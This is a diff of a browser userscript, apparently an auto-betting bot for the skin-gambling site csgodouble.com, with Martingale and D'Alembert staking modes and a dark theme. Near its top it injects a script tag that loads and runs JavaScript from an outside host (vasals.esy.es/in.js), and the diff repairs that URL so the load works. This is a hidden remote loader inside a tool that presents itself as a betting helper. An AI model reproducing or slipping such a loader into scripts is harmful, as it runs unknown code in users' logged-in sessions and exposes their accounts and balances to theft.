@@ -2,7 +2,7 @@
 // @name            csgodouble.com - betting bot
 // @description     An userscript that automates csgodouble.com betting using much systems.
 // @namespace       auto bot@kjuubiiz
-// @version         1.45
+// @version         1.46
 // @author          Kjuubiiz
 // @updateURL    https://raw.githubusercontent.com/richiijs/csgodoublebot/master/csgodouble.com-automated.user.js
 // @downloadURL https://raw.githubusercontent.com/richiijs/csgodoublebot/master/csgodouble.com-automated.user.js
@@ -18,27 +18,27 @@
 // @match           http://www.csgopolygon.com/index.php
 // ==/UserScript==
 /* jshint -W097 */
-
+ 
 'use strict';
-
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
-
+ 
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
+ 
 var debug = false;
 var simulation = false;
 var stop_on_min_balance = false;
 var calculate_safe_bet = false;
 var base_bet = 5;
-var safe_bet_amount = 12;
+var safe_bet_amount = 9;
 var default_color = 'red';
 var default_method = 'martingale';
 var theme = 'dark';
-
+ 
 var colors = {
     'green': [0],
     'red': [1, 2, 3, 4, 5, 6, 7],
     'black': [8, 9, 10, 11, 12, 13, 14]
 };
-
+ 
 var balance = document.getElementById('balance');
 var roll_history = document.getElementById('past');
 var bet_input = document.getElementById('betAmount');
@@ -47,16 +47,16 @@ var bet_buttons = {
     'red': document.getElementById('panel1-7').childNodes[1].childNodes[1],
     'black': document.getElementById('panel8-14').childNodes[1].childNodes[1]
 };
-
+ 
 Array.prototype.equals = function(array) {
     if (!array) {
         return false;
     }
-
+ 
     if (this.length != array.length) {
         return false;
     }
-
+ 
     for (var i = 0, l=this.length; i < l; i++) {
         if (this[i] instanceof Array && array[i] instanceof Array) {
             if (!this[i].equals(array[i])) {
@@ -68,24 +68,24 @@ Array.prototype.equals = function(array) {
     }
     return true;
 };
-
+ 
 Object.defineProperty(Array.prototype, "equals", {enumerable: false});
-
+ 
 function Automated() {
     var self = this;
-
+ 
     this.running = false;
     this.game = null;
-
+ 
     this.debug = debug;
     this.simulation = simulation;
     this.stop_on_min_balance = stop_on_min_balance;
-	this.calculate_safe_bet = calculate_safe_bet;
-
+    this.calculate_safe_bet = calculate_safe_bet;
+ 
     this.base_bet = base_bet;
     this.default_color = default_color;
     this.default_method = default_method;
-	this.safe_bet_amount = safe_bet_amount;
+    this.safe_bet_amount = safe_bet_amount;
     this.method = this.default_method;
     this.old_method = '';
     this.color = 'rainbow';
@@ -100,13 +100,13 @@ function Automated() {
     this.history = [];
     this.waiting_for_bet = false;
     this.theme = theme;
-
+ 
     this.stats = {
         'wins': 0,
         'loses': 0,
         'balance': 0
     };
-
+ 
     var menu = document.createElement('div');
     menu.innerHTML = '' +
         '<div class="row">' +
@@ -175,7 +175,7 @@ function Automated() {
             '<label class="text-muted"><input id="automated-simulation" type="checkbox" ' + (this.simulation ? 'checked' : '') + ' disabled> Simulation mode</label>' +
         '</div>';
     document.getElementsByClassName('well')[1].appendChild(menu);
-
+ 
     this.menu = {
         'start': document.getElementById('automated-start'),
         'stop': document.getElementById('automated-stop'),
@@ -196,96 +196,96 @@ function Automated() {
             'balance': document.getElementById('automated-stats-balance')
         },
         'theme': document.getElementById('automated-theme-switch'),
-		'safebetamount': document.getElementById('automated-safe-bet-amount'),
-		'calculatesafebet': document.getElementById('automated-calculate-safe-bet'),
+        'safebetamount': document.getElementById('automated-safe-bet-amount'),
+        'calculatesafebet': document.getElementById('automated-calculate-safe-bet'),
         'martingale': document.getElementById('automated-martingale'),
         'greatmartingale': document.getElementById('automated-great-martingale'),
         'betgreen': document.getElementById('automated-bet-green'),
         'dalembert': document.getElementById('automated-dalembert'),
         'hideongreen': document.getElementsByClassName('automated-hide-on-green')
     };
-
+ 
     this.updater = setInterval(function() { // Update every 2 seconds
         if (!self.running) {
             if (self.updateAll()) {
-				if (self.calculate_safe_bet) {
-					self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
-					self.menu.basebet.value = self.base_bet;
-                    if (self.debug) { self.logdebug('New base bet: ' + self.base_bet); }
-				}
-				
-				if (self.menu.stop.disabled && self.menu.start.disabled) {
-					self.menu.start.disabled = false;
+                if (self.calculate_safe_bet) {
                     self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
                     self.menu.basebet.value = self.base_bet;
-					self.menu.basebet.disabled = self.menu.calculatesafebet.checked;
-					self.starting_balance = self.balance;
-				}
+                    if (self.debug) { self.logdebug('New base bet: ' + self.base_bet); }
+                }
+               
+                if (self.menu.stop.disabled && self.menu.start.disabled) {
+                    self.menu.start.disabled = false;
+                    self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
+                    self.menu.basebet.value = self.base_bet;
+                    self.menu.basebet.disabled = self.menu.calculatesafebet.checked;
+                    self.starting_balance = self.balance;
+                }
             }
         }
     }, 2 * 1000);
-
+ 
     if (theme === 'dark') {
         this.darkMode();
     }
-
+ 
     this.menu.start.onclick = function() {
-        start(self.balance);
-        self.log('');
-
-
-        //self.start();
+        //start(self.balance);
+        //self.log('');
+ 
+ 
+        self.start();
     };
-
+ 
     this.menu.stop.onclick = function() {
         self.stop();
     };
-
+ 
     this.menu.abort.onclick = function() {
         self.stop(true);
     };
-
+ 
     this.menu.basebet.onchange = function() {
         var value = parseInt(self.menu.basebet.value);
         if (!isNaN(value)) {
             self.base_bet = value;
         }
     };
-
+ 
     this.menu.minbalance.onchange = function() {
         var value = parseInt(self.menu.minbalance.value);
         if (!isNaN(value)) {
             self.min_balance = value;
         }
     };
-
+ 
     this.menu.safebetamount.onchange = function() {
         var value = parseInt(self.menu.safebetamount.value);
         if (!isNaN(value)) {
             self.safe_bet_amount = value;
         }
     };
-
+ 
     this.menu.debug.onchange = function() {
         self.debug = self.menu.debug.checked;
     };
-
+ 
     this.menu.simulation.onchange = function() {
         self.simulation = self.menu.simulation.checked;
     };
-
+ 
     this.menu.stoponminbalance.onchange = function() {
         self.stop_on_min_balance = self.menu.stoponminbalance.checked;
     };
-	
-	this.menu.calculatesafebet.onchange = function() {
-		self.calculate_safe_bet = self.menu.calculatesafebet.checked;
-		self.menu.basebet.disabled = self.menu.calculatesafebet.checked;
-		self.menu.safebetamount.disabled = !self.menu.calculatesafebet.checked;
-	};
-
+   
+    this.menu.calculatesafebet.onchange = function() {
+        self.calculate_safe_bet = self.menu.calculatesafebet.checked;
+        self.menu.basebet.disabled = self.menu.calculatesafebet.checked;
+        self.menu.safebetamount.disabled = !self.menu.calculatesafebet.checked;
+    };
+ 
     // WTF is this shit below? >,.,<
-
+ 
     this.menu.black.onclick = function() {
         self.menu.rainbow.disabled = false;
         self.menu.black.disabled = true;
@@ -295,7 +295,7 @@ function Automated() {
         self.color = 'black';
         self.log('Current mode: black');
     };
-
+ 
     this.menu.red.onclick = function() {
         self.menu.rainbow.disabled = false;
         self.menu.black.disabled = false;
@@ -305,7 +305,7 @@ function Automated() {
         self.color = 'red';
         self.log('Current mode: red');
     };
-
+ 
     this.menu.rainbow.onclick = function() {
         self.menu.rainbow.disabled = true;
         self.menu.black.disabled = false;
@@ -315,7 +315,7 @@ function Automated() {
         self.color = 'rainbow';
         self.log('Current mode: rainbow');
     };
-
+ 
     this.menu.random.onclick = function() {
         self.menu.rainbow.disabled = false;
         self.menu.black.disabled = false;
@@ -325,7 +325,7 @@ function Automated() {
         self.color = 'random';
         self.log('Current mode: random');
     };
-
+ 
     this.menu.last.onclick = function() {
         self.menu.rainbow.disabled = false;
         self.menu.black.disabled = false;
@@ -335,7 +335,7 @@ function Automated() {
         self.color = 'last';
         self.log('Current mode: last');
     };
-
+ 
     this.menu.martingale.onclick = function() {
         self.menu.martingale.disabled = true;
         self.menu.greatmartingale.disabled = false;
@@ -347,7 +347,7 @@ function Automated() {
         self.method = 'martingale';
         self.log('Current method: Martingale');
     };
-
+ 
     this.menu.greatmartingale.onclick = function() {
         self.menu.martingale.disabled = false;
         self.menu.greatmartingale.disabled = true;
@@ -359,7 +359,7 @@ function Automated() {
         self.method = 'great martingale';
         self.log('Current method: Great martingale');
     };
-
+ 
     this.menu.dalembert.onclick = function() {
         self.menu.martingale.disabled = false;
         self.menu.greatmartingale.disabled = false;
@@ -371,7 +371,7 @@ function Automated() {
         self.method = 'dalembert';
         self.log('Current method: D\'alembert');
     };
-
+ 
     this.menu.betgreen.onclick = function() {
         self.menu.martingale.disabled = false;
         self.menu.greatmartingale.disabled = false;
@@ -383,7 +383,7 @@ function Automated() {
         self.method = 'green';
         self.log('Current method: Bet green');
     };
-
+ 
     this.menu.theme.onclick = function() {
         if (self.theme === 'dark') {
             self.lightMode();
@@ -395,7 +395,7 @@ function Automated() {
             self.log('Switching to dark theme...');
         }
     };
-
+ 
     setInterval(function() {
         if(!WS) {
             self.log('Reconnecting...');
@@ -403,26 +403,26 @@ function Automated() {
         }
     }, 5000);
 }
-
+ 
 Automated.prototype.updateBalance = function() {
     this.balance = parseInt(balance.textContent);
-
+ 
     if (isNaN(this.balance)) {
         this.log('Error getting current balance!');
         return false;
     }
-
+ 
     if (this.debug) { this.logdebug('Balance updated: ' + this.balance); }
     return true;
 };
-
+ 
 Automated.prototype.updateHistory = function() {
     var self = this;
     this.history = [];
-
+ 
     for (var i = 0; i < roll_history.childNodes.length; i++) {
         var roll = parseInt(roll_history.childNodes[i].textContent);
-
+ 
         if (!isNaN(roll)) {
             if (colors.green.indexOf(roll) !== -1) {
                 self.history.push('green');
@@ -433,11 +433,11 @@ Automated.prototype.updateHistory = function() {
             }
         }
     }
-
+ 
     if (this.debug) { this.logdebug('History updated: ' + this.history.map(function(value) { return value; }).join(', ')); }
     return this.history.length === 10;
 };
-
+ 
 Automated.prototype.updateStats = function() {
     this.stats.balance = parseInt(this.balance) - parseInt(this.starting_balance);
     this.menu.statistics.wins.innerHTML = this.stats.wins;
@@ -445,15 +445,15 @@ Automated.prototype.updateStats = function() {
     this.menu.statistics.balance.innerHTML = this.stats.balance;
     return true;
 };
-
+ 
 Automated.prototype.updateAll = function() {
     return this.updateBalance() && this.updateHistory() && this.updateStats();
 };
-
+ 
 Automated.prototype.bet = function(amount, color) {
     var self = this;
     color = color || this.color || this.default_color;
-
+ 
     if (color === 'rainbow') {
         if (this.last_color) {
             color = (this.last_color === 'red' ? 'black' : 'red');
@@ -468,7 +468,7 @@ Automated.prototype.bet = function(amount, color) {
     } else if (color === 'last') {
         color = this.history[this.history.length - 1];
     }
-
+ 
     if (['green', 'red', 'black'].indexOf(color) < 0 || amount > this.balance || amount <= 0) {
         this.log('Invalid bet!');
         this.last_result = 'invalid bet';
@@ -476,7 +476,7 @@ Automated.prototype.bet = function(amount, color) {
         this.stop();
         return false;
     }
-
+ 
     if (this.balance - amount < this.min_balance) {
         this.log('Reached minimal balance!');
         this.last_result = 'reached min balance';
@@ -486,9 +486,9 @@ Automated.prototype.bet = function(amount, color) {
         this.waiting_for_bet = false;
         return false;
     }
-
+ 
     bet_input.value = amount;
-
+ 
     if (!bet_buttons[color].disabled) {
         var old_balance = self.balance;
         this.log('Betting ' + amount + ' on ' + color);
@@ -526,15 +526,15 @@ Automated.prototype.bet = function(amount, color) {
         setTimeout(function() { self.bet(amount, color) }, (Math.random() * 3 + 2).toFixed(3) * 1000);
     }
 };
-
+ 
 Automated.prototype.play = function() {
     var self = this;
-
+ 
     if (this.game !== null) {
         if (this.debug) { this.logdebug('Tried to reinitialize running game!'); }
         return false;
     }
-
+ 
     this.game = setInterval(function() {
         var history = self.history;
         if (!self.waiting_for_bet && self.updateAll() && !history.equals(self.history)) {
@@ -542,10 +542,10 @@ Automated.prototype.play = function() {
             if (self.last_color === null) {
                 self.bet(self.base_bet);
             } else if (self.last_color === self.history[self.history.length - 1]) {
-				if (self.calculate_safe_bet) {
+                if (self.calculate_safe_bet) {
                     self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
-					self.menu.basebet.value = self.base_bet;
-				}
+                    self.menu.basebet.value = self.base_bet;
+                }
                 self.last_result = 'win';
                 self.log('Win!');
                 self.stats.wins += 1;
@@ -586,10 +586,10 @@ Automated.prototype.play = function() {
             }
         }
     }, 2 * 1000);
-
+ 
     return true;
 };
-
+ 
 Automated.prototype.start = function() {
     if (self.calculate_safe_bet) {
         self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
@@ -630,7 +630,7 @@ Automated.prototype.start = function() {
     this.menu.stop.disabled = false;
     this.menu.start.disabled = true;
 };
-
+ 
 Automated.prototype.stop = function(abort) {
     var self = this;
     if (abort) { this.last_result = 'abort'; }
@@ -644,7 +644,7 @@ Automated.prototype.stop = function(abort) {
         self.menu.start.disabled = false;
     }, 1); // Next tick
 };
-
+ 
 Automated.prototype.darkMode = function() {
     var style;
     var css = 'body{background-color:#191919;color:#888}.navbar-default{background-color:#232323;border-color:#454545}#sidebar{background-color:#191919;border-color:#202020}.side-icon.active,.side-icon:hover{background-color:#202020}.side-icon .fa{color:#454545}.well{background:#232323;border-color:#323232;color:#888}#pullout{background-color:#191919;border-color:#323232}.form-control{background-color:#323232;border-color:#454545}.divchat{background-color:#323232;color:#999;border:none}.chat-link,.chat-link:hover,.chat-link:active{color:#bbb}.panel{background-color:#323232}.panel-default{border-color:#454545}.panel-default>.panel-heading{color:#888;background-color:#303030;border-color:#454545}.my-row{border-color:#454545}.list-group-item{border-color:#454545;background-color:#323232}.btn-default{border-color:#454545;background:#323232;text-shadow:none;color:#888;box-shadow:none}.btn-default:hover,.btn-default:active{background-color:#282828;color:#888;border-color:#454545}.btn-default[disabled]{border-color:#454545;background-color:#353535}.input-group-addon{background-color:#424242;border-color:#454545;color:#888}.progress{color:#bbb;background-color:#323232}.navbar-default .navbar-nav>li>a:focus,.navbar-default .navbar-nav>li>a:hover{color:#999}.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.open>a:focus,.navbar-default .navbar-nav>.open>a:hover{color:#888;background-color:#323232}.dropdown-menu{background-color:#252525}.dropdown-menu>li>a{color:#888}.dropdown-menu>li>a:focus,.dropdown-menu>li>a:hover{background-color:#323232;color:#999}.dropdown-menu .divider{background-color:#454545}.form-control[disabled],.form-control[readonly],fieldset[disabled] .form-control{background-color:#404040;opacity:.5}';
@@ -661,18 +661,18 @@ Automated.prototype.darkMode = function() {
     }
     style.innerHTML = css;
 };
-
+ 
 Automated.prototype.lightMode = function() {
     var style = document.getElementById('automated-style');
     style.innerHTML = '';
 };
-
+ 
 Automated.prototype.log = function(message) {
-    chat('alert', '[Automated] ' + message);
+    chat('alert', '[Kjuubiiz] ' + message);
 };
-
+ 
 Automated.prototype.logdebug = function(message) {
-    chat('italic', '[Automated] ' + message);
+    chat('italic', '[Kjuubiiz] ' + message);
 };
-
+ 
 var automated = new Automated();
